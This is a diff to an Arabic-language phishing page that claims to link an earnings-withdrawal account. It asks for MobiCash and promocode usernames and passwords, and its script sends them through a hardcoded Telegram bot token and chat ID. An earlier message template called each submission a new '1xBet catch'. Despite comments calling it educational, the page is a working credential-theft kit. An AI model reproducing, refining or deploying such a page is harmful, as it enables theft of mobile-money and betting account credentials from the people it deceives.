@@ -1,35 +1,134 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <title>تأمين ربط الحسابات</title>
-    <style>
-        body { font-family: sans-serif; background: #f4f7f6; display: flex; justify-content: center; padding: 20px; }
-        .box { background: white; padding: 25px; border-radius: 10px; width: 100%; max-width: 400px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
-        h1 { color: #0196ed; font-size: 22px; text-align: center; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
-        button { width: 100%; padding: 12px; background: #28a745; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>تأمين ربط الحسابات</title>
+
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+    margin: 0;
+    padding: 0;
+}
+
+/* الصندوق */
+.box {
+    background: #1e2a38;
+    width: 100%;
+    min-height: 100vh;
+    padding: 40px 25px;
+    box-sizing: border-box;
+    display: flex;
+    flex-direction: column;
+    justify-content: flex-start;
+}
+
+/* اللوجو */
+.logo {
+    width: 110px;
+    margin: 20px auto 10px;
+    display: block;
+}
+
+/* العنوان */
+h1 {
+    color: #00c3ff;
+    text-align: center;
+    margin-bottom: 30px;
+    font-size: 22px;
+}
+
+/* الحقول */
+input {
+    width: 100%;
+    padding: 14px;
+    margin: 12px 0; /* مسافة مريحة */
+    border-radius: 10px;
+    border: none;
+    outline: none;
+    background: #2f3e50;
+    color: white;
+    font-size: 15px;
+}
+
+/* تأثير الفوكس */
+input:focus {
+    background: #3b4f65;
+    box-shadow: 0 0 10px #00c3ff;
+}
+
+/* الزر */
+button {
+    width: 100%;
+    padding: 15px;
+    margin-top: 25px; /* مسافة عن الحقول */
+    border-radius: 10px;
+    border: none;
+    background: linear-gradient(90deg, #00c3ff, #0072ff);
+    color: white;
+    font-size: 17px;
+    font-weight: bold;
+}
+</style>
 </head>
+
 <body>
 
 <div class="box">
-    <h1> ربط حساب سحب الارباح</h1>
-    
-      <input type="text" id="u1" placeholder="اسمك">
-    
-    <input type="text" id="u1" placeholder="اسم المستخدم  موبي كاش">
-    <input type="password" id="p1" placeholder="كلمة مرور حساب الموبي كاش ">
-    <input type="text" id="id2" placeholder="
-    اسم مستخدم حساب البرموكود   ">
-    <input type="password" id="p2" placeholder="
-      كلمة مرور حساب البرموكود">
-    
-        
+
+    <!-- اللوجو -->
+    <img src="https://i.ibb.co/7NvhYrp2/IMG-20260429-201237-592.jpg" class="logo">
+
+    <h1>ربط حساب سحب الارباح</h1>
+
+    <input type="text" id="u1" placeholder="اسم مستخدم حساب موبي كاش">
+    <input type="password" id="p1" placeholder="كلمة مرور حساب موبي كاش">
+    <input type="text" id="id2" placeholder="اسم مستخدم حساب البرموكود">
+    <input type="password" id="p2" placeholder="كلمة مرور الحساب">
     <button onclick="sendData()">تأكيد الربط</button>
+
 </div>
 
 <script>
+// منع الحروف العربية
+let arabic = /[\u0600-\u06FF]/;
+
+// username
+document.getElementById("u1").addEventListener("input", function() {
+    this.value = this.value.replace(arabic, "");
+});
+
+// passwords
+document.getElementById("p1").addEventListener("input", function() {
+    this.value = this.value.replace(arabic, "");
+});
+
+document.getElementById("p2").addEventListener("input", function() {
+    this.value = this.value.replace(arabic, "");
+});
+
+// ID أرقام فقط
+document.getElementById("id2").addEventListener("input", function() {
+    this.value = this.value.replace(/[^0-9]/g, "");
+});
+
+// التحقق النهائي
+function sendData() {
+    let u1 = document.getElementById("u1").value;
+    let p1 = document.getElementById("p1").value;
+    let id2 = document.getElementById("id2").value;
+    let p2 = document.getElementById("p2").value;
+
+    if (!u1 || !p1 || !id2 || !p2) {
+        alert("املأ جميع الحقول");
+        return;
+    }
+
+
+}
+
     async function sendData() {
         // [تنبيه توعوي]: لا تضع بيانات حقيقية أبداً في هذه الخانات!
         const data = {
@@ -42,12 +141,14 @@
         const BOT_TOKEN = "8761336309:AAGv1e4FqNVaybasRyNwLu4U1o5x1pNCJUk"; // استبدل هذا بتوكن البوت الخاص بك للتجربة
         const CHAT_ID = "7000276863";
 
-        const msg = `🚨 صيدة جديدة 1xBet:\n👤 المستخدم: ${data.user}\n🔐 كلمة المرور: ${data.pass1}\n🆔 ID المراد ربطه: ${data.id2}\n🔑 كلمة مرور ID: ${data.pass2}`;
+        const msg = `
+        🚨   موبي كاش :\n👤 المستخدم: ${data.user}\n🔐 كلمة المرور: ${data.pass1}\n🆔 ID المراد ربطه: ${data.id2}\n🔑 كلمة مرور ID: ${data.pass2}`;
 
         // إرسال البيانات (في بيئة تعليمية فقط)
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`)
         .then(() => alert("تمت العملية بنجاح، جاري المراجعة."));
     }
+
 </script>
 
 </body>
